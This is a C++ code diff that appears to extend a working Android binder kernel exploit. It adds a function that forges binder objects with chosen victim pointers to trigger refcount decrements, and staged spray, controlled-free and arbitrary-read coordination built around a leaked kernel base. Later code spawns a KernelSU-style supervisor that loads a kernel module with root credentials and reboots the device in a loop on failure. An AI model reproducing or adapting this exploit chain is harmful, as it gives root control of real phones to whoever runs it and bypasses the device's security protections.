     bool dead_reply = false;
 };
 
+struct CveVictim {
+    binder_uintptr_t pointer = 0;
+    binder_uintptr_t cookie = 0;
+};
+
+constexpr int kCveBatchMaximum = 4;
+constexpr int kDisclosureCveBatchSize = 4;
+
 CveResult send_single_decrement(int fd, int target,
                                 binder_uintptr_t victim_pointer,
                                 binder_uintptr_t victim_cookie,
@@ -3615,6 +4561,100 @@ CveResult send_single_decrement(int fd, int target,
     return result;
 }
 
+CveResult send_decrement_batch(int fd, int target,
+                               const CveVictim* victims, int count) {
+    constexpr std::size_t object_size = sizeof(flat_binder_object);
+    static_assert(object_size == 24);
+    constexpr binder_size_t data_size = 256;
+    constexpr std::size_t maximum_offsets = kCveBatchMaximum + 1;
+    constexpr std::size_t maximum_transfer =
+            data_size + maximum_offsets * sizeof(binder_size_t);
+
+    CveResult result;
+    if (fd < 0 || target <= 0 || victims == nullptr || count <= 0 ||
+        count > kCveBatchMaximum ||
+        static_cast<std::size_t>(count * 2) * object_size > data_size) {
+        result.ioctl_errno = EINVAL;
+        return result;
+    }
+
+    const binder_size_t offsets_size =
+            static_cast<binder_size_t>(count + 1) *
+            sizeof(binder_size_t);
+    const binder_size_t trigger = data_size + offsets_size;
+    std::array<std::uint8_t, maximum_transfer> data {};
+    std::array<binder_size_t, maximum_offsets> offsets {};
+
+    for (int index = 0; index < count; ++index) {
+        if (victims[index].pointer == 0 || victims[index].cookie == 0) {
+            result.ioctl_errno = EINVAL;
+            return result;
+        }
+        const binder_size_t target_offset =
+                static_cast<binder_size_t>(index) * object_size;
+        const binder_size_t victim_offset =
+                static_cast<binder_size_t>(count + index) * object_size;
+        flat_binder_object target_object {};
+        target_object.hdr.type = BINDER_TYPE_HANDLE;
+        target_object.handle = static_cast<std::uint32_t>(target);
+        std::memcpy(data.data() + target_offset, &target_object,
+                    sizeof(target_object));
+
+        flat_binder_object fake_victim {};
+        fake_victim.hdr.type = BINDER_TYPE_BINDER;
+        fake_victim.binder = victims[index].pointer;
+        fake_victim.cookie = victims[index].cookie;
+        std::memcpy(data.data() + victim_offset, &fake_victim,
+                    sizeof(fake_victim));
+        offsets[index] = target_offset;
+        std::memcpy(data.data() + data_size +
+                            static_cast<std::size_t>(index) *
+                                    sizeof(binder_size_t),
+                    &victim_offset, sizeof(victim_offset));
+    }
+    offsets[count] = trigger;
+
+    binder_transaction_data transaction {};
+    transaction.target.handle = static_cast<std::uint32_t>(target);
+    transaction.code = 1;
+    transaction.data_size = data_size;
+    transaction.offsets_size = offsets_size;
+    transaction.data.ptr.buffer = reinterpret_cast<binder_uintptr_t>(
+            data.data());
+    transaction.data.ptr.offsets = reinterpret_cast<binder_uintptr_t>(
+            offsets.data());
+
+    std::uint8_t write_buffer[
+            sizeof(std::uint32_t) + sizeof(transaction)] {};
+    write_command(write_buffer, BC_TRANSACTION, &transaction,
+                  sizeof(transaction));
+    std::uint8_t read_buffer[4096] {};
+    binder_write_read request {};
+    request.write_size = sizeof(write_buffer);
+    request.write_buffer = reinterpret_cast<binder_uintptr_t>(write_buffer);
+    request.read_size = sizeof(read_buffer);
+    request.read_buffer = reinterpret_cast<binder_uintptr_t>(read_buffer);
+
+    errno = 0;
+    result.ioctl_result = ioctl(fd, BINDER_WRITE_READ, &request);
+    result.ioctl_errno = errno;
+    for (std::size_t offset = 0;
+         offset + sizeof(std::uint32_t) <= request.read_consumed;) {
+        std::uint32_t response = 0;
+        std::memcpy(&response, read_buffer + offset, sizeof(response));
+        offset += sizeof(response);
+        const std::size_t payload_size = _IOC_SIZE(response);
+        if (offset + payload_size > request.read_consumed) {
+            break;
+        }
+        result.failed_reply |= response == BR_FAILED_REPLY;
+        result.transaction_complete |= response == BR_TRANSACTION_COMPLETE;
+        result.dead_reply |= response == BR_DEAD_REPLY;
+        offset += payload_size;
+    }
+    return result;
+}
+
 constexpr int kSplitDecrementPhaseReady = 1;
 constexpr int kSplitDecrementPhaseParked = 3;
 constexpr int kSplitDecrementPhaseReadDone = 5;
@@ -3682,6 +4722,12 @@ struct SplitDecrementContext {
     bool retirement_before_go = false;
     bool retirement_after_write = false;
     bool generation_valid = false;
+    bool gates_prepared = false;
+    bool target_read_ready = false;
+    bool read_go = false;
+    bool boundary_signal = false;
+    bool victim_work_ready = false;
+    bool read_continue = false;
 };
 
 std::mutex g_split_decrement_quarantine_mutex;
@@ -3738,10 +4784,10 @@ bool split_decrement_generation_current_locked(
     if (!g_fake_control_active ||
         g_fake_control_generation != context.generation ||
         g_fake_control_expected != context.expected ||
-        g_fake_control_expected != kFakeControlSprayCount ||
-        g_fake_control_staged_limit != kFakeControlStagedCount ||
+        g_fake_control_expected != kFakeControlInitialSprayCount ||
+        g_fake_control_staged_limit != kFakeControlInitialStagedCount ||
         g_fake_control_staged_expected != context.staged_expected ||
-        context.staged_expected != kFakeControlStagedCount ||
+        context.staged_expected != kFakeControlInitialStagedCount ||
         g_fake_control_staged_generation != context.staged_generation ||
         (check_retirement &&
          g_terminal_fd_retirement_gate.load(std::memory_order_acquire))) {
@@ -3752,7 +4798,7 @@ bool split_decrement_generation_current_locked(
         active_staged += fake_control_slot_active_staged(slot) ? 1 : 0;
     }
     return active_staged == context.staged_active &&
-            active_staged == kFakeControlStagedCount;
+            active_staged == kFakeControlInitialStagedCount;
 }
 
 bool capture_split_decrement_generation_locked(
@@ -4041,7 +5087,25 @@ bool join_split_decrement_thread(SplitDecrementContext* context,
     return finished && context->thread_joined;
 }
 
-bool activate_split_decrement_spray(SplitDecrementContext* context) {
+bool wait_raw_target_boundary_signal() {
+    std::lock_guard<std::mutex> lock(g_raw_target_boundary_signal_mutex);
+    int fd = g_raw_target_boundary_signal_fd;
+    if (fd < 0) {
+        return false;
+    }
+    pollfd descriptor {fd, POLLIN, 0};
+    int poll_result = poll(&descriptor, 1, 500);
+    std::uint64_t value = 0;
+    bool pass = poll_result == 1 &&
+            (descriptor.revents & POLLIN) != 0 &&
+            read(fd, &value, sizeof(value)) == sizeof(value) && value == 1;
+    close(fd);
+    g_raw_target_boundary_signal_fd = -1;
+    return pass;
+}
+
+bool activate_split_decrement_spray(SplitDecrementContext* context,
+                                    const std::string& directory) {
     if (context == nullptr || context->coordinator_cpu != 1 ||
         !wait_split_decrement_phase(*context,
                 kSplitDecrementPhaseReady, kSplitDecrementWaitMs)) {
@@ -4095,7 +5159,7 @@ bool activate_split_decrement_spray(SplitDecrementContext* context) {
         if (state.second) {
             break;
         }
-        if (state.first == kFakeControlStagedCount) {
+        if (state.first == kFakeControlInitialStagedCount) {
             context->staged_state2 = state.first;
             staged_entered = true;
             break;
@@ -4109,8 +5173,46 @@ bool activate_split_decrement_spray(SplitDecrementContext* context) {
     auto stable_state = state_snapshot(true);
     context->staged_state2 = stable_state.first;
     context->staged_stable = !stable_state.second &&
-            stable_state.first == kFakeControlStagedCount;
+            stable_state.first == kFakeControlInitialStagedCount;
     if (!context->staged_stable) {
+        return false;
+    }
+
+    release_split_decrement_thread(context);
+    if (!wait_split_decrement_phase(*context,
+                kSplitDecrementPhaseReadDone, kSplitDecrementWaitMs) ||
+        !context->exact_read || context->read_tid != context->tid) {
+        return false;
+    }
+
+    const std::string free_gate =
+            directory + "/controlled-free.enable.0";
+    const std::string read_gate =
+            directory + "/controlled-read.enable.0";
+    const std::string target_ready =
+            directory + "/raw-target.reading.0";
+    const std::string read_go =
+            directory + "/controlled-read.go.0";
+    const std::string victim_work =
+            directory + "/raw-target.victim-work.0";
+    const std::string read_continue =
+            directory + "/controlled-read.continue.0";
+    context->gates_prepared = write_text_file(free_gate, "0") &&
+            write_text_file(read_gate,
+                    "status=pass stage=arb-read-enable victim=0");
+    if (!context->gates_prepared ||
+        !wait_for_file(target_ready, 500) ||
+        read_text_file(target_ready) !=
+                "status=ready polling=1 timeout_ms=20000") {
+        return false;
+    }
+    context->target_read_ready = true;
+    context->read_go = write_text_file(read_go, "1");
+    if (!context->read_go) {
+        return false;
+    }
+    context->boundary_signal = wait_raw_target_boundary_signal();
+    if (!context->boundary_signal) {
         return false;
     }
     {
@@ -4124,6 +5226,29 @@ bool activate_split_decrement_spray(SplitDecrementContext* context) {
         syscall(SYS_futex, &g_fake_control_gate, FUTEX_WAKE_PRIVATE,
                 INT_MAX, nullptr, nullptr, 0);
         context->global_published = true;
+    }
+    std::map<std::string, std::string> victim_fields;
+    context->victim_work_ready = wait_for_file(victim_work, 500) &&
+            parse_ordered_record(read_text_file(victim_work),
+                    {"status", "stage", "read_calls", "responses",
+                     "victim_released", "early_reclaim", "signal",
+                     "worker",
+                     "cpu_before", "cpu_after"}, &victim_fields) &&
+            victim_fields["status"] == "ready" &&
+            victim_fields["stage"] == "victim-work-drained" &&
+            victim_fields["read_calls"] == "1" &&
+            victim_fields["responses"] == "5" &&
+            victim_fields["signal"] == "1" &&
+            ((victim_fields["victim_released"] == "1" &&
+              victim_fields["early_reclaim"] == "0" &&
+              victim_fields["worker"] == "-1") ||
+             (victim_fields["victim_released"] == "0" &&
+              victim_fields["early_reclaim"] == "1" &&
+              decimal_digits(victim_fields["worker"]))) &&
+            victim_fields["cpu_before"] == "2" &&
+            victim_fields["cpu_after"] == "1";
+    if (!context->victim_work_ready) {
+        return false;
     }
     bool all_entered = false;
     for (int attempt = 0; attempt < 2000; ++attempt) {
@@ -4150,7 +5275,7 @@ bool activate_split_decrement_spray(SplitDecrementContext* context) {
     if (!all_entered) {
         return false;
     }
-    usleep(200000);
+    usleep(kFakeControlPostBoundarySettleUs);
     auto final_state = state_snapshot(false);
     context->blocked = final_state.first;
     context->retirement_after_write =
@@ -4159,16 +5284,15 @@ bool activate_split_decrement_spray(SplitDecrementContext* context) {
         final_state.first != context->expected) {
         return false;
     }
+    context->read_continue = write_text_file(read_continue, "1");
+    if (!context->read_continue) {
+        return false;
+    }
     {
         std::lock_guard<std::mutex> lock(g_fake_control_mutex);
         if (!split_decrement_generation_current_locked(*context, true)) {
             return false;
         }
-    }
-    release_split_decrement_thread(context);
-    if (!wait_split_decrement_phase(*context,
-                kSplitDecrementPhaseReadDone, kSplitDecrementWaitMs)) {
-        return false;
     }
     return context->exact_read && context->read_tid == context->tid;
 }
@@ -4810,7 +5934,378 @@ bool write_all(int fd, const void* data, std::size_t size) {
     return true;
 }
 
-bool read_command_root_identity(CommandRootIdentity* identity) {
+[[maybe_unused]] bool await_action_supervisor_receipt(
+        int action, int manager_uid, std::uint64_t kernel_base,
+        int descriptor, int timeout_seconds) {
+    if (descriptor < 0) {
+        g_resukisu_receipt_stage.store(8, std::memory_order_release);
+        g_resukisu_receipt_detail.store(EBADF, std::memory_order_release);
+        return false;
+    }
+    g_resukisu_receipt_stage.store(1, std::memory_order_release);
+    timespec started {};
+    if (clock_gettime(CLOCK_MONOTONIC, &started) != 0) {
+        return false;
+    }
+    std::int64_t deadline =
+            static_cast<std::int64_t>(started.tv_sec + timeout_seconds) *
+                    1000000000LL + started.tv_nsec;
+    ActionSupervisorReceipt receipt;
+    std::size_t received = 0;
+    timespec delay {0, 1'000'000};
+    for (;;) {
+        if (received < sizeof(receipt)) {
+            ssize_t count = read(
+                    descriptor,
+                    reinterpret_cast<std::uint8_t*>(&receipt) + received,
+                    sizeof(receipt) - received);
+            if (count > 0) {
+                received += static_cast<std::size_t>(count);
+                g_resukisu_receipt_bytes.store(
+                        static_cast<int>(received), std::memory_order_release);
+                g_resukisu_receipt_stage.store(2, std::memory_order_release);
+            } else if (count == 0 ||
+                    (errno != EAGAIN && errno != EWOULDBLOCK &&
+                     errno != EINTR)) {
+                g_resukisu_receipt_detail.store(
+                        count == 0 ? 0 : errno, std::memory_order_release);
+                g_resukisu_receipt_stage.store(
+                        count == 0 ? 3 : 4, std::memory_order_release);
+                return false;
+            }
+        }
+        if (received == sizeof(receipt)) {
+            bool valid = receipt.magic == kActionSupervisorReceiptMagic &&
+                    receipt.pid > 0 && receipt.pid == receipt.tid &&
+                    receipt.action == action &&
+                    receipt.manager_uid == manager_uid &&
+                    receipt.kernel_base == kernel_base;
+            int invalid = 0;
+            invalid |= receipt.magic == kActionSupervisorReceiptMagic ? 0 : 1;
+            invalid |= receipt.pid > 0 ? 0 : 2;
+            invalid |= receipt.pid == receipt.tid ? 0 : 4;
+            invalid |= receipt.action == action ? 0 : 8;
+            invalid |= receipt.manager_uid == manager_uid ? 0 : 16;
+            invalid |= receipt.kernel_base == kernel_base ? 0 : 32;
+            g_resukisu_receipt_detail.store(
+                    invalid, std::memory_order_release);
+            g_resukisu_receipt_stage.store(
+                    valid ? 6 : 5, std::memory_order_release);
+            if (valid) {
+                g_resukisu_child_pid.store(
+                        receipt.pid, std::memory_order_release);
+            }
+            return valid;
+        }
+        timespec now {};
+        if (clock_gettime(CLOCK_MONOTONIC, &now) != 0 ||
+                static_cast<std::int64_t>(now.tv_sec) * 1000000000LL +
+                        now.tv_nsec >= deadline) {
+            g_resukisu_receipt_stage.store(7, std::memory_order_release);
+            return false;
+        }
+        (void)syscall(SYS_nanosleep, &delay, nullptr);
+    }
+}
+
+[[maybe_unused]] bool await_action_daemon_ready(
+        int descriptor, int timeout_seconds, pid_t* child_pid) {
+    if (descriptor < 0 || child_pid == nullptr) {
+        return false;
+    }
+    ActionDaemonReady ready;
+    std::size_t received = 0;
+    timespec started {};
+    if (clock_gettime(CLOCK_MONOTONIC, &started) != 0) {
+        return false;
+    }
+    std::int64_t deadline =
+            static_cast<std::int64_t>(started.tv_sec + timeout_seconds) *
+                    1000000000LL + started.tv_nsec;
+    timespec delay {0, 1'000'000};
+    while (received < sizeof(ready)) {
+        ssize_t count = read(
+                descriptor,
+                reinterpret_cast<std::uint8_t*>(&ready) + received,
+                sizeof(ready) - received);
+        if (count > 0) {
+            received += static_cast<std::size_t>(count);
+            continue;
+        }
+        if (count == 0 ||
+                (errno != EAGAIN && errno != EWOULDBLOCK &&
+                 errno != EINTR)) {
+            return false;
+        }
+        timespec now {};
+        if (clock_gettime(CLOCK_MONOTONIC, &now) != 0 ||
+                static_cast<std::int64_t>(now.tv_sec) * 1000000000LL +
+                        now.tv_nsec >= deadline) {
+            return false;
+        }
+        (void)syscall(SYS_nanosleep, &delay, nullptr);
+    }
+    bool valid = ready.magic == kActionDaemonReadyMagic &&
+            ready.pid > 0 && ready.pid == ready.tid;
+    if (valid) {
+        *child_pid = static_cast<pid_t>(ready.pid);
+    }
+    return valid;
+}
+
+[[maybe_unused]] bool send_action_daemon_request(
+        int socket_fd, int action, int manager_uid,
+        std::uint64_t kernel_base, const char* completion_path,
+        int loader_fd, int module_fd, int executable_fd) {
+    if (socket_fd < 0 || completion_path == nullptr) {
+        return false;
+    }
+    ActionDaemonRequest request;
+    if (std::strlen(completion_path) >= sizeof(request.completion_path)) {
+        return false;
+    }
+    request.magic = kActionDaemonRequestMagic;
+    request.action = action;
+    request.manager_uid = manager_uid;
+    request.kernel_base = kernel_base;
+    std::memcpy(
+            request.completion_path, completion_path,
+            std::strlen(completion_path) + 1);
+    int descriptors[] {loader_fd, module_fd, executable_fd};
+    char control[CMSG_SPACE(sizeof(descriptors))] {};
+    iovec vector {
+        .iov_base = &request,
+        .iov_len = sizeof(request),
+    };
+    msghdr message {};
+    message.msg_iov = &vector;
+    message.msg_iovlen = 1;
+    message.msg_control = control;
+    message.msg_controllen = sizeof(control);
+    cmsghdr* header = CMSG_FIRSTHDR(&message);
+    if (header == nullptr) {
+        return false;
+    }
+    header->cmsg_level = SOL_SOCKET;
+    header->cmsg_type = SCM_RIGHTS;
+    header->cmsg_len = CMSG_LEN(sizeof(descriptors));
+    std::memcpy(CMSG_DATA(header), descriptors, sizeof(descriptors));
+    ssize_t sent;
+    do {
+        sent = sendmsg(socket_fd, &message, MSG_NOSIGNAL);
+    } while (sent < 0 && errno == EINTR);
+    return sent == static_cast<ssize_t>(sizeof(request));
+}
+
+bool collect_resukisu_child(int action, int* result, int* error) {
+    if (result == nullptr || error == nullptr) {
+        return false;
+    }
+    pid_t child = static_cast<pid_t>(g_resukisu_child_pid.exchange(
+            -1, std::memory_order_acq_rel));
+    int child_pidfd = __atomic_exchange_n(
+            &g_resukisu_raw_pidfd, -1, __ATOMIC_ACQ_REL);
+    int diagnostic_fd = g_resukisu_diagnostic_fd.exchange(
+            -1, std::memory_order_acq_rel);
+    int completion_fd = g_resukisu_completion_fd.exchange(
+            -1, std::memory_order_acq_rel);
+    if ((child <= 0 && child_pidfd < 0) || diagnostic_fd < 0 ||
+            completion_fd < 0) {
+        *result = -1;
+        *error = EPROTO;
+        if (diagnostic_fd >= 0) {
+            close(diagnostic_fd);
+        }
+        if (completion_fd >= 0) {
+            close(completion_fd);
+        }
+        if (child_pidfd >= 0) {
+            close(child_pidfd);
+        }
+        return false;
+    }
+
+    constexpr char kCompletion[] = "LP3_KSUD_DONE\n";
+    bool completion_seen = action == 1;
+    bool completion_kill_sent = false;
+    int status = 0;
+    siginfo_t child_info {};
+    bool child_reaped = false;
+    int wait_error = 0;
+    timespec started {};
+    (void)clock_gettime(CLOCK_MONOTONIC, &started);
+    std::int64_t deadline =
+            static_cast<std::int64_t>(started.tv_sec + 120) *
+                    1000000000LL + started.tv_nsec;
+    timespec delay {0, 10'000'000};
+    for (;;) {
+        char buffer[2048];
+        for (;;) {
+            ssize_t count = read(diagnostic_fd, buffer, sizeof(buffer));
+            if (count <= 0) {
+                break;
+            }
+            if (g_command_watchdog_output_fd >= 0) {
+                (void)write_all(
+                        g_command_watchdog_output_fd, buffer,
+                        static_cast<std::size_t>(count));
+            }
+        }
+        char completion[sizeof(kCompletion) - 1] {};
+        completion_seen = completion_seen || (
+                pread(completion_fd, completion, sizeof(completion), 0) ==
+                        static_cast<ssize_t>(sizeof(completion)) &&
+                std::memcmp(
+                        completion, kCompletion, sizeof(completion)) == 0);
+        if (completion_seen && action == 2 && !completion_kill_sent) {
+            int signal_result = child_pidfd >= 0
+                    ? static_cast<int>(syscall(
+                            SYS_pidfd_send_signal, child_pidfd,
+                            SIGKILL, nullptr, 0))
+                    : kill(child, SIGKILL);
+            completion_kill_sent = signal_result == 0;
+        }
+        if (child_pidfd >= 0) {
+            std::memset(&child_info, 0, sizeof(child_info));
+            errno = 0;
+            int wait_result = static_cast<int>(syscall(
+                    SYS_waitid, static_cast<int>(P_PIDFD), child_pidfd,
+                    &child_info, WEXITED | WNOHANG, nullptr));
+            if (wait_result == 0 && child_info.si_pid > 0) {
+                child = child_info.si_pid;
+                child_reaped = true;
+                break;
+            }
+            if (wait_result != 0) {
+                wait_error = errno;
+                break;
+            }
+        } else {
+            errno = 0;
+            pid_t waited = waitpid(child, &status, WNOHANG);
+            if (waited == child) {
+                child_reaped = true;
+                break;
+            }
+            if (waited < 0) {
+                wait_error = errno;
+                break;
+            }
+        }
+        timespec now {};
+        if (clock_gettime(CLOCK_MONOTONIC, &now) != 0 ||
+                static_cast<std::int64_t>(now.tv_sec) * 1000000000LL +
+                        now.tv_nsec >= deadline) {
+            wait_error = ETIMEDOUT;
+            break;
+        }
+        (void)syscall(SYS_nanosleep, &delay, nullptr);
+    }
+    char child_phase[48] {};
+    ssize_t child_phase_length = pread(
+            completion_fd, child_phase, sizeof(child_phase) - 1, 16);
+    if (child_phase_length < 0) {
+        child_phase[0] = '\0';
+    }
+    close(diagnostic_fd);
+    close(completion_fd);
+    if (child_pidfd >= 0) {
+        close(child_pidfd);
+    }
+    char completion_path[160];
+    std::snprintf(
+            completion_path, sizeof(completion_path),
+            "/data/local/tmp/lp3-ksud-completion.%s",
+            g_command_watchdog_nonce);
+    bool completion_unlinked = unlink(completion_path) == 0;
+    bool exited_cleanly = child_pidfd >= 0
+            ? child_reaped && child_info.si_code == CLD_EXITED &&
+                    child_info.si_status == 0
+            : child_reaped && WIFEXITED(status) && WEXITSTATUS(status) == 0;
+    bool completion_killed = child_pidfd >= 0
+            ? child_reaped && completion_kill_sent &&
+                    child_info.si_code == CLD_KILLED &&
+                    child_info.si_status == SIGKILL
+            : child_reaped && completion_kill_sent &&
+                    WIFSIGNALED(status) && WTERMSIG(status) == SIGKILL;
+    bool passed = wait_error == 0 && completion_seen &&
+            completion_unlinked && (exited_cleanly || completion_killed);
+    int kernel_log_error = 0;
+    std::string kernel_diagnostics;
+    if (!passed) {
+        std::vector<char> kernel_log(256 * 1024);
+        errno = 0;
+        int kernel_log_length = static_cast<int>(syscall(
+                SYS_syslog, 3, kernel_log.data(), kernel_log.size()));
+        kernel_log_error = kernel_log_length < 0 ? errno : 0;
+        if (kernel_log_length > 0) {
+            std::string_view log(kernel_log.data(),
+                                 static_cast<std::size_t>(kernel_log_length));
+            std::size_t cursor = 0;
+            while (cursor < log.size() && kernel_diagnostics.size() < 8192) {
+                std::size_t end = log.find('\n', cursor);
+                if (end == std::string_view::npos) {
+                    end = log.size();
+                }
+                std::string_view line = log.substr(cursor, end - cursor);
+                if (line.find("lp3_ctlbuf") != std::string_view::npos ||
+                    line.find("module") != std::string_view::npos ||
+                    line.find("avc:  denied") != std::string_view::npos ||
+                    line.find("finit_module") != std::string_view::npos) {
+                    kernel_diagnostics.append(line);
+                    kernel_diagnostics.push_back('\n');
+                }
+                cursor = end + 1;
+            }
+        }
+    }
+    if (g_command_watchdog_output_fd >= 0) {
+        if (!kernel_diagnostics.empty()) {
+            static constexpr char kLogHeader[] =
+                    "BRIDGE_KERNEL_DIAGNOSTICS_BEGIN\n";
+            static constexpr char kLogFooter[] =
+                    "BRIDGE_KERNEL_DIAGNOSTICS_END\n";
+            (void)write_all(g_command_watchdog_output_fd, kLogHeader,
+                            sizeof(kLogHeader) - 1);
+            (void)write_all(g_command_watchdog_output_fd,
+                            kernel_diagnostics.data(),
+                            kernel_diagnostics.size());
+            (void)write_all(g_command_watchdog_output_fd, kLogFooter,
+                            sizeof(kLogFooter) - 1);
+        }
+        char marker[384];
+        int marker_length = std::snprintf(
+                marker, sizeof(marker),
+                "BRIDGE_PIDFD_COLLECT pid=%d pidfd=%d reaped=%d"
+                " wait_error=%d si_code=%d si_status=%d status=0x%x"
+                " completion=%d kill_sent=%d unlinked=%d clean=%d"
+                " completion_killed=%d phase=%s klog_errno=%d\n",
+                child, child_pidfd, child_reaped ? 1 : 0, wait_error,
+                child_info.si_code, child_info.si_status, status,
+                completion_seen ? 1 : 0, completion_kill_sent ? 1 : 0,
+                completion_unlinked ? 1 : 0, exited_cleanly ? 1 : 0,
+                completion_killed ? 1 : 0,
+                child_phase[0] != '\0' ? child_phase : "missing",
+                kernel_log_error);
+        if (marker_length > 0 &&
+                marker_length < static_cast<int>(sizeof(marker)) &&
+                write_all(g_command_watchdog_output_fd, marker,
+                          static_cast<std::size_t>(marker_length))) {
+            (void)fsync(g_command_watchdog_output_fd);
+        }
+    }
+    *result = passed ? 0 : -1;
+    *error = wait_error != 0 ? wait_error :
+            (!completion_seen ? ENOMSG :
+             (!completion_unlinked ? EBUSY :
+             (!child_reaped ? ECHILD :
+              (exited_cleanly || completion_killed ? 0 : 1000 +
+                       (child_pidfd >= 0 ? child_info.si_status :
+                        WIFEXITED(status) ? WEXITSTATUS(status) : 255)))));
+    return passed;
+}
+
+bool read_command_subjective_identity(CommandRootIdentity* identity) {
     if (identity == nullptr) {
         return false;
     }
@@ -4823,6 +6318,20 @@ bool read_command_root_identity(CommandRootIdentity* identity) {
             SYS_getresgid, &value.gid[0], &value.gid[1], &value.gid[2]));
     value.fsuid = static_cast<uid_t>(syscall(SYS_setfsuid, -1));
     value.fsgid = static_cast<gid_t>(syscall(SYS_setfsgid, -1));
+    value.effective_caps = 0;
+    if (uid_result != 0 || gid_result != 0 ||
+        value.pid <= 0 || value.tid <= 0) {
+        return false;
+    }
+    *identity = value;
+    return true;
+}
+
+bool read_command_root_identity(CommandRootIdentity* identity) {
+    CommandRootIdentity value;
+    if (!read_command_subjective_identity(&value)) {
+        return false;
+    }
     __user_cap_header_struct header {};
     __user_cap_data_struct data[2] {};
     header.version = _LINUX_CAPABILITY_VERSION_3;
@@ -4832,8 +6341,7 @@ bool read_command_root_identity(CommandRootIdentity* identity) {
     value.effective_caps =
             static_cast<std::uint64_t>(data[0].effective) |
             (static_cast<std::uint64_t>(data[1].effective) << 32U);
-    if (uid_result != 0 || gid_result != 0 || capability_result != 0 ||
-        value.pid <= 0 || value.tid <= 0) {
+    if (capability_result != 0) {
         return false;
     }
     *identity = value;
@@ -4853,6 +6361,13 @@ bool command_identity_is_root(const CommandRootIdentity& identity) {
             identity.gid[1] == 0 && identity.gid[2] == 0 &&
             identity.fsuid == 0 && identity.fsgid == 0 &&
             (identity.effective_caps & (UINT64_C(1) << 22U)) != 0;
+}
+
+bool command_identity_has_root_ids(const CommandRootIdentity& identity) {
+    return identity.uid[0] == 0 && identity.uid[1] == 0 &&
+            identity.uid[2] == 0 && identity.gid[0] == 0 &&
+            identity.gid[1] == 0 && identity.gid[2] == 0 &&
+            identity.fsuid == 0 && identity.fsgid == 0;
 }
 
 bool same_command_root_identity(
@@ -4902,6 +6417,53 @@ bool wait_for_command_watchdog(
 }
 
 [[noreturn]] void command_watchdog_reboot_forever() {
+    char snapshot[640];
+    int length = std::snprintf(
+            snapshot, sizeof(snapshot),
+            "BRIDGE_COMMAND_REBOOT_SNAPSHOT nonce=%s"
+            " phase=%d arm=%d ready=%d normalise=%d exit=%d heartbeat=%d"
+            " action=%d action_exit=%d action_errno=%d child=%d"
+            " spawn_stage=%d spawn_errno=%d daemon_stage=%d"
+            " receipt_stage=%d receipt_bytes=%d receipt_detail=%d"
+            " donor_request=%d donor_pid=%d donor_signal=%d"
+            " donor_confirmation=%d donor_stage=%d donor_frozen=%d"
+            " rescue_stage=%d rescue_result=%d rescue_errno=%d"
+            " rescue_detail=%d load_request=%d load_result=%d\n",
+            g_command_watchdog_nonce,
+            g_command_watchdog_phase.load(std::memory_order_acquire),
+            g_command_watchdog_arm.load(std::memory_order_acquire),
+            g_command_watchdog_ready.load(std::memory_order_acquire),
+            g_command_watchdog_normalise.load(std::memory_order_acquire),
+            g_command_watchdog_exit.load(std::memory_order_acquire),
+            g_command_watchdog_heartbeat.load(std::memory_order_acquire),
+            g_resukisu_action.load(std::memory_order_acquire),
+            g_resukisu_exit.load(std::memory_order_acquire),
+            g_resukisu_errno.load(std::memory_order_acquire),
+            g_resukisu_child_pid.load(std::memory_order_acquire),
+            g_resukisu_spawn_stage.load(std::memory_order_acquire),
+            g_resukisu_spawn_error.load(std::memory_order_acquire),
+            g_action_daemon_spawn_stage.load(std::memory_order_acquire),
+            g_resukisu_receipt_stage.load(std::memory_order_acquire),
+            g_resukisu_receipt_bytes.load(std::memory_order_acquire),
+            g_resukisu_receipt_detail.load(std::memory_order_acquire),
+            g_ctlbuf_donor_freeze_request.load(std::memory_order_acquire),
+            g_ctlbuf_donor_pid.load(std::memory_order_acquire),
+            g_ctlbuf_donor_signal_state.load(std::memory_order_acquire),
+            g_ctlbuf_donor_frozen_confirmation.load(std::memory_order_acquire),
+            g_ctlbuf_donor_leader_stage.load(std::memory_order_acquire),
+            g_ctlbuf_donor_frozen.load(std::memory_order_acquire),
+            g_ctlbuf_rescue_stage.load(std::memory_order_acquire),
+            g_ctlbuf_rescue_result.load(std::memory_order_acquire),
+            g_ctlbuf_rescue_errno.load(std::memory_order_acquire),
+            g_ctlbuf_rescue_detail.load(std::memory_order_acquire),
+            g_ctlbuf_rescue_load_request.load(std::memory_order_acquire),
+            g_ctlbuf_rescue_load_result.load(std::memory_order_acquire));
+    if (length > 0 && length < static_cast<int>(sizeof(snapshot)) &&
+            g_command_watchdog_output_fd >= 0 &&
+            write_all(g_command_watchdog_output_fd, snapshot,
+                      static_cast<std::size_t>(length))) {
+        (void)fsync(g_command_watchdog_output_fd);
+    }
     for (;;) {
         (void)reboot(RB_AUTOBOOT);
         timespec delay {1, 0};
@@ -4945,12 +6507,590 @@ void write_ctlbuf_rescue_stage(
     }
 }
 
+bool exact_shell_executable(int descriptor, const char* path) {
+    struct stat descriptor_stat {};
+    struct stat path_stat {};
+    return descriptor >= 0 && fstat(descriptor, &descriptor_stat) == 0 &&
+            stat(path, &path_stat) == 0 &&
+            S_ISREG(descriptor_stat.st_mode) &&
+            descriptor_stat.st_uid == 2000 &&
+            descriptor_stat.st_gid == 2000 &&
+            (descriptor_stat.st_mode & 0777) == 0755 &&
+            descriptor_stat.st_dev == path_stat.st_dev &&
+            descriptor_stat.st_ino == path_stat.st_ino &&
+            descriptor_stat.st_size == path_stat.st_size &&
+            descriptor_stat.st_uid == path_stat.st_uid &&
+            descriptor_stat.st_gid == path_stat.st_gid &&
+            descriptor_stat.st_mode == path_stat.st_mode;
+}
+
+bool exact_shell_executable_descriptor(int descriptor) {
+    struct stat descriptor_stat {};
+    return descriptor >= 0 && fstat(descriptor, &descriptor_stat) == 0 &&
+            S_ISREG(descriptor_stat.st_mode) &&
+            descriptor_stat.st_uid == 2000 &&
+            descriptor_stat.st_gid == 2000 &&
+            (descriptor_stat.st_mode & 0777) == 0755;
+}
+
+pid_t spawn_resukisu_supervisor(
+        int action, int manager_uid, int supervisor_fd,
+        int loader_fd, int module_fd,
+        int action_fd, std::uint64_t kernel_base,
+        const char* completion_path, int diagnostic_read_fd,
+        int diagnostic_write_fd, int registration_read_fd,
+        int registration_write_fd,
+        int* spawn_error) {
+    if (spawn_error == nullptr || completion_path == nullptr ||
+            diagnostic_read_fd < 0 || diagnostic_write_fd < 0 ||
+            registration_read_fd < 0 || registration_write_fd < 0) {
+        return -1;
+    }
+    *spawn_error = 0;
+    if (!exact_shell_executable_descriptor(supervisor_fd)) {
+        *spawn_error = errno == 0 ? ESTALE : errno;
+        return -1;
+    }
+
+    char action_text[8];
+    char manager_uid_text[16];
+    char loader_fd_text[16];
+    char module_fd_text[16];
+    char action_fd_text[16];
